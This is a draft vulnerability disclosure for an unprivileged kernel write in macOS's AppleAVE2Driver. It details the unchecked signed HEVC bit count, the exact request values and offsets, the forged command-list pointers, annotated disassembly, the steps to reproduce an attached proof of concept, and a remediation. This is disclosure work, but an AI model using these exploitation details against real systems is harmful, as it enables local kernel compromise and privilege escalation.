# AppleAVE2 HEVC signed bit count yields an unprivileged attacker-addressed kernel write

## Submission status

**PENDING FINAL STOCK CAPTURE. DO NOT SUBMIT THIS DRAFT YET.**

The exact current-build chain, direct uid 501 trigger, deterministic request
construction, and safe command-8 reachability are complete. The remaining
filing gate is one physical stock run showing a write data abort with
`FAR == x8 ==` the same boot's `_COMM_PAGE_ASB_TARGET_KERN_ADDRESS`.

## Summary

An unprivileged local user can open `AppleAVE2Driver` and pass an attacker
controlled HEVC SPS bit-count field through external selector 5 (`Start`). The
driver adds four to this 32-bit field and passes the result to
`AVE_SyntaxWriter::WriteU/WriteBits` without validating its signed lower bound.

`WriteBits` accepts the negative count, rewinds its signed position, and checks
only whether each destination index is below the writer capacity. It never
checks whether the signed index is nonnegative before two `strb` instructions
use it with `sxtw`. This lets selector 5 write attacker-selected bytes before
the writer buffer into the live kernel client object.

On macOS 27 build `26A5421a`, the request can replace both qwords of the
embedded input command list at `client+0x280` and `client+0x288`. The first
qword is made non-NULL and unequal to the list head; the second qword is a full
attacker-selected 64-bit destination address. External selector 7 (`Process`)
then reaches driver command 8, creates a valid kernel command node, and calls
`_AVE_DLList_PushBack`. `PushBack` checks the forged pointers only for NULL and
performs:

```text
str new_command_node, [attacker_selected_64_bit_address]
```

The resulting primitive is an eight-byte attacker-addressed kernel write. The
written value is a valid kernel-created command-node pointer. A local uid 501
process can therefore corrupt a chosen writable kernel address without first
knowing or forging a pointer-authentication code. The attached Target Flag
variant directs this store to the current boot's ASB kernel-address target.

## Affected software

Primary test build:

```text
Product: macOS 27.0
Build: 26A5421a
Kernel: xnu-13432.1.9~3/RELEASE_ARM64_T6000
Architecture: arm64
Service: AppleAVE2Driver
Kext: com.apple.driver.AppleAVE2
Kext UUID: EC06EADA-5FFB-3D64-A203-814754F1D5AA
Kext SHA-256: a95362f273cb36c59d1df0ebf6ff84e53288a91db3eed566c35117e01ee03818
```

The same vulnerable invariant and command-list write consumer are present in
macOS 26.6 build `25G72` and all archived macOS 27 betas checked through
`26A5421a`. This is not claimed as a macOS 27 beta regression or beta bonus.
The exact object geometry differs by build, so the attached request is pinned
to `26A5421a`.

## Security impact

The bug crosses from an ordinary uid 501 process into the kernel through a
directly openable IOKit user client. No root privileges are used by the trigger. The
primitive writes a valid live kernel pointer to an attacker-selected 64-bit
address. This is stronger than an out-of-bounds crash or a bounded relative
overwrite and is suitable for corrupting kernel objects or security state as
part of local privilege escalation.

For an unambiguous qualification, the PoC reads the current boot's
`_COMM_PAGE_ASB_TARGET_KERN_ADDRESS`, places that full qword in the forged list
tail, and invokes selector 7. The expected fault is the write instruction in
`_AVE_DLList_PushBack`, with `WnR=1` and `FAR == x8 ==` that same-boot target.

## Unprivileged reachability and argument shapes

The PoC runs as uid 501, looks up `AppleAVE2Driver`, and opens user-client type
1:

```c
IOServiceOpen(service, mach_task_self(), 1, &connection);
```

It then uses these structure-method calls:

| Order | Selector | Operation | Structure input | Structure output |
|---|---:|---|---:|---:|
| 1 | 1 | Open | `0x768` | `0x38` |
| 2 | 4 | Prepare | `0x12c08` | `0x20` |
| 3 | 3 | Config, async | `0x38` | `0x20` |
| 4 | 5 | Start and corrupt list | `0x12c18` | `0x150` |
| 5 | 7 | Process command 8 | `0x30` | `0x20` |

The exact attached source refuses euid 0 and the stock runner additionally
requires uid 501.

## Root cause: unchecked signed lower bound

The selector-5 request field at `+0x487c` becomes HEVC SPS `+0x1f4`. The
current exploit request sets it to `0xfffee05a`. The driver independently loads
that value, adds four, and calls the writer:

```text
0xfffffe0008e9dfac  ldr  w1,[x24,x23,lsl#2]  ; attacker long-term value
0xfffffe0008e9dfb0  ldr  w8,[x20,#0x1f4]     ; attacker count
0xfffffe0008e9dfb4  add  w2,w8,#4            ; 0xfffee05e = -73634 signed
0xfffffe0008e9dfbc  bl   AVE_SyntaxWriter::WriteU
```

There is no `cmp`/branch bounding the count field before the addition or call.
`WriteBits` then selects the negative count and rewinds its signed position:

```text
0xfffffe0008e72228  cbz  w2,return
0xfffffe0008e72250  cmp  w2,w12
0xfffffe0008e72254  csel w12,w2,w12,lt
0xfffffe0008e72258  add  w11,w12,w11
0xfffffe0008e7225c  str  w11,[x0,#8]
```

Both byte-write sites validate only the upper side:

```text
0xfffffe0008e722a8  cmp  w11,w12
0xfffffe0008e722ac  b.ge reject
0xfffffe0008e722b4  strb w10,[x12,w11,sxtw]

0xfffffe0008e722e8  cmp  w11,w13
0xfffffe0008e722ec  b.ge reject
0xfffffe0008e722f4  strb w12,[x13,w11,sxtw]
```

Neither sink has an instruction checking `w11 >= 0`. The capacity/base comes
from the live writer object and is not attacker memory. The precise bounds gap
is therefore: `index < capacity` is checked, while the sibling condition
`index >= 0` required by the signed `sxtw` index is absent at both stores.

## Converting the underwrite into a full-address store

The writer buffer starts at `client+0x2648`. The embedded input list is:

```text
list head = client+0x280
list tail = client+0x288
tail byte index = 0x288 - 0x2648 = -0x23c0 = -9152
```

The negative writer begins from bit position 336. With request count
`0xfffee05a`, the driver uses signed count `-73634`, placing the later VUI timing
fields at byte index `-9152`. The two request-controlled 32-bit timing values at
selector-5 offsets `+0x628c` and `+0x6290` emit eight consecutive bytes. The
PoC encodes the current boot's ASB kernel-address target in little-endian order,
so `client+0x288` becomes that full 64-bit address.

Immediately preceding VUI stores alter the list-head qword at `client+0x280`:

```text
index -9160: c0
index -9158: f8
index -9157: 0d
index -9153: 81
index -9152..-9145: full attacker-selected list-tail qword
```

These head bytes make the first pointer nonzero and unequal to the list head.
The consumer does not dereference that forged first pointer before the target
store.

## Complete post-timing store extent

The instruction-faithful model now covers every syntax operation after the
forged timing qword, through `Write_seq_parameter_set_rbsp` and
`AlignToByte`. The hash-pinned template fixes every branch-controlling operand:

```text
request +0x6294 / SPS+0x1c0c = 0  poc_proportional_to_timing_flag
request +0x629c / SPS+0x1c14 = 1  num_ticks_poc_diff_one_minus1
request +0x62c9 / SPS+0x1c41 = 0  bitstream_restriction_flag
request +0x62e4 / SPS+0x1c5c = 0  sps_extension_present_flag
```

The exact post-timing calls are `WriteBit` at
`0xfffffe0008e9ea30`, `WriteUE(1)` at `0xfffffe0008e9ea5c`,
`WriteBit(0)` at `0xfffffe0008e9ea70`, the sequence-extension
`WriteBit(0)` at `0xfffffe0008e9e060`, and `AlignToByte` at
`0xfffffe0008e9d84c`. The zero bitstream-restriction flag branches directly
out of VUI at `0xfffffe0008e9ea7c`, skipping its three flag bits and five UE
fields.

Starting immediately after the tail at bit position `-73152`, these operations
finish at `-73136`. Because the negative-position alignment arithmetic uses a
signed remainder, the only later byte store is:

```text
index -9143: 00  rbsp_alignment_zero_bits  -> client+0x291
```

There is no store at `-9144/client+0x290` and no store after `-9143`. The first
pipeline pointer starts at `client+0x2d0`, index `-9080`, leaving 63 bytes
between the final stored byte and the pipeline field.

`client+0x291` is the second byte of the input list sentinel's owner pointer
at list `+0x10`, initialized by `_AVE_DLList_Init` at
`0xfffffe0008ce577c..0xfffffe0008ce5780`. The command-8 path's first list
consumer remains `_AVE_DLList_PushBack`; before the target write it loads only
list `+0` and `+8`. It does not read list `+0x10`, and its first access through
the forged tail is still the target `str x1,[x8]`.

## Selector 7 consumer

Before selector 5, the PoC creates one UCInfo IOSurface containing two records:

```text
slot 0, stride 0:       command type 5 for Start
slot 1, stride 0x11d80: command type 7 for Process
slot 1 + 0x9cc:         live ordinary data-IOSurface ID
```

Selector 7 requests frame slot 1 at request `+0x28`. This dual-record setup is
required because selector 5 caches the UCInfo pool; changing the external
IOSurface after Start does not change the cached kernel record.

The current command-8 path is:

```text
AppleAVE2UserClient::Process
  AVE_Client_Process                         0xfffffe0008d54c04
    AppleAVE2Driver::ProcessCmd(cmd=8)       0xfffffe0008e9bacc
      AVE_Drv::ProcessCmd command-8 branch   0xfffffe0008d99784
        AVE_Client_PreUpdate                 0xfffffe0008d9981c
        AVE_Client_AppendCmd                 0xfffffe0008d99838
          AVE_Client_CreateCmd               0xfffffe0008d57354
          _AVE_DLList_PushBack(list,new_cmd) 0xfffffe0008d5762c
```

`PreUpdate` uses the intact pipeline pointer and unrelated fields.
`CreateCmd` uses a separate block-buffer pool. The first command-8 consumer of
the corrupted list at `client+0x280` is `_AVE_DLList_PushBack`.

## Final write sink and complete operand audit

```text
_AVE_DLList_PushBack @ 0xfffffe0008ce5c28

0xfffffe0008ce5c3c  ldr x8,[x0]       ; forged first
0xfffffe0008ce5c40  cbz x8,cold       ; checks only first != NULL
0xfffffe0008ce5c44  ldr x9,[x0,#8]    ; attacker-selected tail
0xfffffe0008ce5c48  cbz x9,cold       ; checks only tail != NULL
0xfffffe0008ce5c4c  stp x0,x9,[x1]    ; initialize valid new node
0xfffffe0008ce5c50  cmp x8,x0
0xfffffe0008ce5c54  csel x8,x0,x9,eq  ; forged first != head selects tail
0xfffffe0008ce5c58  str x1,[x8]       ; eight-byte kernel write
```

Every sink operand is accounted for:

| Operand | Source | Existing bound | Missing validation |
|---|---|---|---|
| Destination `x8` | forged list tail at `client+0x288` | `cbz x9` only | no canonicality, writable-range, ownership, allocation, type, PAC, or list-integrity check |
| Branch selector `first` | forged list head at `client+0x280` | `cbz x8`, then equality comparison | no provenance or valid-list-node check |
| Value `x1` | kernel-created command node | valid kernel allocation | attacker does not need to forge it |
| Width | fixed `str x1` | eight bytes | not applicable |

The sink is write-first with respect to the forged tail: no instruction reads
through the attacker-selected destination before `str x1,[x8]`.

## Dynamic evidence already captured

### Exact-source safe command-8 control

The exact attached source was compiled with only the venue gate disabled, then
run with a known-clean SPS count of 7. No ASB payload was generated or fired.
External selectors 1, 4, 3, 5, and 7 all returned zero. DTrace observed the
type-7 slot, successful data-surface creation and DART mapping, command 8, and:

```text
CMD8_PUSHBACK list=fffffec10f160280
              expected=fffffec10f160280
              node=fffffe2059528c00
```

Evidence directory:

```text
evidence/stock-source-exact-safe-control-20260827T144316Z/
```

This proves the packaged source reaches the exact final list consumer. It is a
safe control, not the malicious write capture.

### Research-boot writer corroboration

On the current build, uid 501 input dynamically changed the same signed writer
destination byte from `0x40` to `0x42`, then to `0x43` when only the attacker
value changed. Changing only the signed count shifted the destination from
`base-2` to `base-1`. Kernel pre/post snapshots and zero return codes from the
writer and generator established chosen-index/chosen-byte kernel writes.

A separate research-boot request turned the live pipeline field into canonical
kernel pointer `0xfffffe24f00b4a60`; the kernel then dereferenced exactly
`x8+0x18` at static PC `0xfffffe0008d4b154`. These runs had SIP disabled and
GZAlloc boot arguments, so they are supporting mechanism evidence only and are
not presented as stock or filing-grade Target Flag captures.

## Additional downstream manifestation: unchecked Start stack loop

The same signed underwrite can also corrupt the already-validated DLB record-0
count at `client+0x308` (`record+0x28`). This is an additional unsafe consumer
of the reported root cause, not a second independently demonstrated selector
bug.

The normal DLB producer constrains both sides before copying the EU map into the
record. `AVE_CheckEUMap` first requires the effective capacity to fit the
device capacity (`cmp w11,w10; b.le` at
`0xfffffe0008e85b50..0xfffffe0008e85b54`), then rejects a record count above
that capacity (`cmp w9,w11; b.gt` at
`0xfffffe0008e85b74..0xfffffe0008e85b78`) or below zero (`tbnz w9,#31` at
`0xfffffe0008e85b7c`). The current capacity tables limit a legitimate count to
1, 2, or 4. `AVE_DLB::ApplyStatic` subsequently copies this validated map into
the record at `0xfffffe0008d66ef4..0xfffffe0008d66f18`.

After the reported underwrite corrupts that record in place,
`AVE_Client_Start` checks only the lower side of the count:

```text
0xfffffe0008d528f8  ldr  w9,[record,#0x28]
0xfffffe0008d528fc  cmp  w9,#1
0xfffffe0008d52900  b.lt skip
0xfffffe0008d52910  lsl  x13,x10,#3
0xfffffe0008d52914  ldr  w13,[x12,x13]
0xfffffe0008d52924  ldr  x15,[x28,w11,uxtw#3]
0xfffffe0008d5292c  str  x13,[x28,w11,uxtw#3]
0xfffffe0008d5293c  cmp  x9,x10
0xfffffe0008d52940  b.ne loop
```

The source index `x10*8` has no upper comparison against the record span, and
the destination index `w11=floor(x10/8)` has no upper comparison against the
four-qword local at `x29-0x80`. A research-boot run reached the destination
read-modify-write loop with `w9=0x7fffffff` and faulted on the kernel stack
guard at static `0xfffffe0008d52924`. That artifact used the ungated research
binary with SIP disabled and is mechanism evidence only. No route controlling
this count independently of the signed-index corruption has been demonstrated;
accordingly, the stack loop is included here as a second sink of the same root
cause and is not being filed separately.

## Final stock Target Flag evidence

**PENDING. Replace this section only after `verify_stock_write_panic.py`
prints `VERIFY=PASS`.**

Required final facts:

```text
uid = 501
SIP = enabled
authenticated root = enabled
boot args = empty in both runtime and NVRAM views
physical Apple Silicon with AppleAVE2Driver
build = 26A5421a
AppleAVE2 UUID = EC06EADA-5FFB-3D64-A203-814754F1D5AA
panicked task = ave2_direct_replay
ESR.WnR = 1
static faulting PC = 0xfffffe0008ce5c58
x8 = FAR = immediate same-boot ASB_TARGET_KERN_ADDRESS
GZAlloc report = absent
```

Insert after capture:

```text
Boot session UUID: [PENDING]
Immediate ASB kernel-address target: [PENDING]
Panic FAR: [PENDING]
Panic x8: [PENDING]
Panic ESR: [PENDING]
Panic file SHA-256: [PENDING]
Verifier output: [PENDING]
```

## Reproduction

The attachment directory is:

```text
stock_write_capture_26A5421a/
```

The runner is intentionally pinned to build `26A5421a` and refuses root,
virtualized hardware, SIP-disabled state, disabled authenticated root, nonempty
boot arguments, missing AMFI, invalid trigger signature, or a running debugger
or tracer.

On the restored stock physical test Mac, run as uid 501:

```sh
cd stock_write_capture_26A5421a
python3 -m unittest -v test_verify_stock_write_panic.py
./run_once_stock_write_capture.zsh --preflight-only
```

`--preflight-only` checks the complete venue and artifact state, performs two
same-boot ASB reads, synthesizes the exact request, and exits before opening
the AppleAVE2 user client. Continue only if it prints:

```text
PREFLIGHT-ONLY PASSED
```

Then fire exactly once:

```sh
./run_once_stock_write_capture.zsh
```

Expected behavior is a kernel panic. If the replay returns, do not rerun it
automatically. After reboot, copy the panic into the generated evidence
directory and run:

```sh
python3 verify_stock_write_panic.py panic-full.panic \
  --prefire-immediate prefire_immediate.txt
```

Only `VERIFY=PASS` qualifies the final capture.

## Current attachment hashes

```text
388b1442f9441436d6872a8d6eb3835e2e8167d77affb63acb5b8b9cc6f54412  ave2_direct_replay
6ee791740d8506e6b2cc7a968bb097b76c334beaf694dbbd61566ee021b31a07  ave2_direct_replay_write.c
6092f8546887b1b7536268669087bd9e80bec444889800f415b94abad7c33511  asb_read
d12b8b673f3b67b67c7946d5e0d93763ba1fea2a57b924e28d60d0fb87a7e882  asb_read.c
cc3310384854ab0d725a038f073e4a76ce9fbf2891906ce86def90a6046c8ade  selector1-input.bin
c4d335c93a01a598d36a1906d56a7a9bc0e62cb7021d329185fd610635e9eda0  selector3-input.bin
a7c3013cc14eb80c281ae546c3acfb1611f7b1fc4ebc16849808a26102ce83f0  selector4-stock-prior.bin
12911a6708d7817e925d847c28b35baf2890ede614e1741c66b68f5db708a3bc  selector5-field2d0-redirect60.bin
867f97dfe9f71604dedf5d2ee2c353a53e9e88898966eafaaf16ccc575206f34  model_hevc_timing_pointer.py
0417117c57c1e65c32063578f7b0df3e1351197ed7f076259330c16e19116fc8  synthesize_live_asb_write_request.py
b6d693538841fc78a8dd371036c0032479497460ca013d037a789b04dd1f596b  test_model_hevc_timing_pointer.py
3aec7b3e74fd314ff11808942051af1276f39a8ffda7934f8dff93c2441484b2  verify_stock_write_panic.py
bbcdf30aaadf37bcbfd5243c2efaf8dcd9c3e30c7176f0b4256c098d7b55024a  prefire_capture.sh
778392564c00d54bff778cd8aec1e68794dd128c58f3a4d55db3c4d04aec2140  flagcheck.py
3c3be4e4b9009a93dae6f2e02fa07cc9e41bd6258efae181871242de0e954d3e  test_verify_stock_write_panic.py
f530f373d4d4860ebce85ee14cbb1e73ce8533d8c7396085e3bd58c1887cf070  run_once_stock_write_capture.zsh
```

## Persistence

Static comparison found the same complete invariant in:

| Build | AppleAVE2 UUID | SHA-256 |
|---|---|---|
| `25G72` | `765F4C86-5C6F-3C24-A7C9-CC92E3226846` | `b97830b56e4364e7bcc84b534389d223fb1876c4c4728fc94270c79eded212b2` |
| `26A5353q` | `594FF910-0C12-356D-88A6-6C6D6A538D00` | `befde22fbc4ebd19fe40149f698ee8849de254e3864e890b8d4a7ad42478928d` |
| `26A5368g` | `B49C74E9-2A29-3C13-9BBD-ACB05ABF3049` | `66a30b90a673cca67842c7803357204084803a0ee5472ecc1d170938dc6606bb` |
| `26A5378j` | `A089F885-502C-377F-BCC6-F56632EF0BB0` | `fcd751eaf0f693ec802b17669ce549ce9144f02792d746eb0955d5685a58565c` |
| `26A5421a` | `EC06EADA-5FFB-3D64-A203-814754F1D5AA` | `a95362f273cb36c59d1df0ebf6ff84e53288a91db3eed566c35117e01ee03818` |

In every listed build, the attacker count is independently loaded and passed
as `field+4`; both writer stores have only signed upper-bound checks and use a
signed index; command 8 reaches the embedded input list; and `PushBack` checks
the forged tail only for NULL before its eight-byte store. Older-build request
counts are not claimed to be portable because the object geometry differs.

## Suggested remediation

Reject any negative writer count and enforce both sides of every destination
index before a store:

```text
0 <= index && index < capacity
```

The check must be performed after the same signed arithmetic and width
conversion used by the sink. Independently validate the HEVC SPS count before
adding four. As defense in depth, `_AVE_DLList_PushBack` should verify that its
head and tail belong to the expected owned list and allocation before writing
through either pointer.
